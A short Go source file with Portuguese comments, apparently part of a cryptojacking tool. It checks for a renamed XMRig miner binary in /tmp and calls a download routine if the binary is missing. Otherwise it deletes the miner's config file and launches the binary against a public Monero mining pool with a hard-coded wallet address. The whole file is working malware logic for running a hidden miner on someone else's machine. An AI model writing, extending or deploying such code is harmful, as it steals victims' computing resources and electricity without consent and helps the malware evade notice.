package main



import (

"os/exec"
"os"
"fmt"

)



//funcao para executa o vkzmn


func exec_vk (){

_,  err_open := os.Open("/tmp/xmrig-6.26.0/vkzmn")



if  err_open != nil {




//fmt.Println("vkzmn nao encontrado")



down_vk() //abaixe  o vkzmn  

}  else  {



//delete  config.json to parse   pool url  and addres wallet   via  argv [0] [1] etc


del :=  exec.Command("rm" , "/tmp/xmrig-6.26.0/config.json")
 
del.Run()


                                     
vk_run := exec.Command("/tmp/xmrig-6.26.0/vkzmn" , 


"--url" , 


"pool.supportxmr.com:3333", 

"--user", 

"4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy" , 

"--pass" , 

"vkzmn" ,  

"--donate-level" ,

"1",  
                                                              

)



 out  ,  err_co :=  vk_run.CombinedOutput()



if  err_co != nil { 

fmt.Print(err_co)

return

}


 
fmt.Println(string(out))

return 


}

}
